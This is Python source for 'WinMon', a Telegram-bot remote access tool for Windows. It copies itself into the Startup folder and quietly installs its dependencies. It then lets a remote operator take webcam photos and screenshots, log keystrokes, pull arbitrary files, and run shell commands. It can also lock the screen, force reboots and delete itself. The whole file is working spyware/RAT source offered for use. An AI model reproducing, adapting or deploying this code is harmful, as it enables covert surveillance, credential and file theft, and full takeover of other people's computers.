"""
██╗    ██╗██╗███╗   ██╗███╗   ███╗ ██████╗ ███╗   ██╗           ██████╗ ██╗   ██╗
██║    ██║██║████╗  ██║████╗ ████║██╔═══██╗████╗  ██║           ██╔══██╗╚██╗ ██╔╝
██║ █╗ ██║██║██╔██╗ ██║██╔████╔██║██║   ██║██╔██╗ ██║           ██████╔╝ ╚████╔╝ 
██║███╗██║██║██║╚██╗██║██║╚██╔╝██║██║   ██║██║╚██╗██║           ██╔═══╝   ╚██╔╝  
╚███╔███╔╝██║██║ ╚████║██║ ╚═╝ ██║╚██████╔╝██║ ╚████║    ██╗    ██║        ██║   
 ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝    ╚═╝        ╚═╝   
                                                                                    -Github@PavanMeka09
"""                                                                         

import subprocess
import telebot
import socket
import platform
import os
from tkinter import messagebox
import tkinter
import sys
import keyboard
import shutil
import pyautogui
import pyttsx3
import cv2

TOKEN = "REPLACE WITH BOT TOKEN"
user_id = 00000000 # REPLACE WITH USER_ID
bot = telebot.TeleBot(TOKEN)
pyautogui.FAILSAFE = False
username = os.getenv("USERNAME")
startup_folder = f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

def add_to_startup():
    destination_file = os.path.join(startup_folder, "WinMon.exe")
    global startup_status
    if not os.path.exists(destination_file):
        shutil.copy("WinMon.exe", startup_folder)
        startup_status = "True (✅)"
    else:
        startup_status = "True (✅)"
    

def install_requirements():
    subprocess.Popen(["pip", "install", "pyTelegramBotAPI", "keyboard", "pyautogui", "pyttsx3", "opencv-python"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=subprocess.CREATE_NO_WINDOW)

def start_bot():
    @bot.message_handler(commands=["start"])
    def start(message):
        if message.from_user.id == user_id:
            os.chdir(startup_folder)
            send_device_info(message)
            register_message_handlers()
        else:
            bot.send_message(message.chat.id, "Not authorized (❌)")

    def send_device_info(message):
        device_info = f"<b>Device Name:</b> {socket.gethostname()} (👤)\n" \
                      "<b>Status:</b> Running (✅)\n" \
                      f"<b>IPv4:</b> {socket.gethostbyname(socket.gethostname())} (🌐)\n" \
                      f"<b>OS:</b> {platform.platform()}\n" \
                      f"<b>Startup Status:</b> {startup_status}\n" \
                      "Use /help to know all available commands.\n\n" \
                      "<a href='https://github.com/PavanMeka09/WinMon'>Click here</a> for source code.\n\n" \
                      "Tool developed by,\n" \
                      "@PavanMeka99\n" \
                      "<a href='https://github.com/pa1-m'>Github@PavanMeka09</a>"
        bot.send_message(message.chat.id, device_info, parse_mode="HTML", disable_web_page_preview=True)

    def register_message_handlers():
        @bot.message_handler(commands=["help"])
        def help(message):
            bot.send_message(message.chat.id, "*Available commands:*\n\n/alert {message}\n/blockscreen\n/ss\n/webcam\n/tts {message}\n/maxvol\n/minvol\n/grab {location}\n/keylog\n/cd {path}\n/cmd {command}\n/reboot\n/shutdown\n/restart\n/exit\n/implode", parse_mode="Markdown")

        @bot.message_handler(func=lambda message: "/alert" in message.text)
        def alert(message):
            msg = message.text.replace("/alert ", "")
            bot.send_message(message.chat.id, "Executed")
            messagebox.showinfo("Alert", msg)

        @bot.message_handler(commands=["webcam"])
        def webcam(message):
            sm = bot.send_message(message.chat.id, "Capturing... (⌛)")
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            cv2.imwrite("image.jpg", frame)
            bot.edit_message_text("Captured (✅)", message.chat.id, sm.message_id)
            with open("image.jpg", "rb") as img:
                bot.send_photo(message.chat.id, img)
            bot.edit_message_text("Received (✅)", message.chat.id, sm.message_id)
            os.remove("image.jpg")

        @bot.message_handler(commands=["blockscreen"])
        def blockscreen(message):
            bot.send_message(message.chat.id, "Blocked")
            bot.send_message(message.chat.id, "Use /reboot to unlock")
            def action_blocker():
                pyautogui.moveTo(0, 0)
                pyautogui.press("esc")
                root.after(50, action_blocker)
            root = tkinter.Tk()
            root.overrideredirect(True)
            root.wm_attributes("-topmost", True)
            root.geometry("%dx%d+0+0" % (root.winfo_screenwidth(), root.winfo_screenheight()))
            action_blocker()
            root.mainloop()

        @bot.message_handler(commands=["ss"])
        def ss(message):
            sm = bot.send_message(message.chat.id, "Receiving... (⌛)")
            pyautogui.screenshot("ss.jpg")
            with open("ss.jpg", "rb") as ss:
                bot.send_photo(message.chat.id, ss)
            bot.edit_message_text("Received (✅)", message.chat.id, sm.message_id)
            os.remove("ss.jpg")

        @bot.message_handler(commands=["maxvol"])
        def maxvol(message):
            bot.send_message(message.chat.id, "Increasing Volume...")
            bot.send_message(message.chat.id, "Use /reboot to stop")
            while True:
                pyautogui.press("volumeup")

        @bot.message_handler(commands=["minvol"])
        def minvol(message):
            bot.send_message(message.chat.id, "Decreasing Volume...")
            bot.send_message(message.chat.id, "Use /reboot to stop")
            while True:
                pyautogui.press("volumedown")

        @bot.message_handler(func=lambda message: "/tts" in message.text)
        def tts(message):
            text = message.text.replace("/tts ", "")
            engine = pyttsx3.init()
            engine.setProperty("rate", 150)
            engine.setProperty("volume", 1.0)
            engine.say(text)
            engine.runAndWait()
            bot.send_message(message.chat.id, "Executed")

        @bot.message_handler(func=lambda message: "/grab" in message.text)
        def grab(message):
            sm = bot.send_message(message.chat.id, "Grabbing...(⌛)")
            path = message.text.replace("/grab ", "")
            if os.path.exists(path):
                with open(path, "rb") as doc:
                    bot.send_document(message.chat.id, doc)
                    bot.edit_message_text("Grabbed Successfully(✅)", message.chat.id, sm.message_id)
            else:
                bot.send_message(message.chat.id, "Invalid File Path (❌)")

        @bot.message_handler(commands=["keylog"])
        def keylog(message):
            pressed_keys = ""
            msg = bot.send_message(message.chat.id, "*Listening:*", parse_mode="Markdown")
            bot.send_message(message.chat.id, "Use /reboot to stop Listening")
            def on_press(event):
                nonlocal pressed_keys
                key_name = event.name.replace("space", " ").replace("ctrl", " {ctrl} ").replace("back", " {back} ").replace("alt", " {alt} ").replace("tab", " {tab} ")
                pressed_keys += key_name
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=f"*Listening:*\n{pressed_keys}", parse_mode="Markdown")
            keyboard.on_press(on_press)

        @bot.message_handler(func=lambda message: "/cmd" in message.text)
        def cmd(message):
            command = message.text.replace("/cmd ", "")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = f"*Output:*\n{result.stdout}" if result.stdout else f"*Error:*\n\n{result.stderr}"
            bot.send_message(message.chat.id, output, parse_mode="Markdown")

        @bot.message_handler(func=lambda message: "/cd" in message.text)
        def cd(message):
            directory = message.text.replace("/cd ", "")
            if os.path.exists(directory):
                os.chdir(directory)
                bot.send_message(message.chat.id, "Directory changed (♻️)")
            else:
                bot.send_message(message.chat.id, "Invalid directory (❌)")

        @bot.message_handler(commands=["reboot"])
        def reboot(message):
            bot.send_message(message.chat.id, "Use /start to start again")
            command = [sys.executable] + sys.argv
            subprocess.Popen(command)
            os._exit(0)

        @bot.message_handler(commands=["restart"])
        def restart(message):
            bot.send_message(message.chat.id, "Executed")
            os.system("shutdown -r -t 0")

        @bot.message_handler(commands=["shutdown"])
        def shutdown(message):
            bot.send_message(message.chat.id, "Executed")
            os.system("shutdown -s -t 0")

        @bot.message_handler(commands=["exit"])
        def exit(message):
            bot.send_message(message.chat.id, "Bot has been stopped")
            os.system("taskkill /f /IM WinMon.exe")
        
        @bot.message_handler(commands=["implode"])
        def implode(message):
            bot.send_message(message.chat.id, f"Please confirm by typing '/hostname' to self-destruct WinMon from the following device\n\nDevice Name: {socket.gethostname()} (👤)\nIPv4: {socket.gethostbyname(socket.gethostname())} (🌐)")
        
        @bot.message_handler(func=lambda message: message.text == f"/{socket.gethostname()}")
        def confirm_implode(message):
            bot.send_message(message.chat.id, "Implode Initiated(☠️)")
            path = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinMon.exe"
            os.system(f"taskkill /f /IM WinMon.exe && del /f {path}")

        @bot.message_handler(func=lambda message: True)
        def invalid(message):
            bot.reply_to(message, "Invalid Command, use /help to know commands")

    bot.infinity_polling()

if __name__ == "__main__":
    add_to_startup()
    install_requirements()
    start_bot()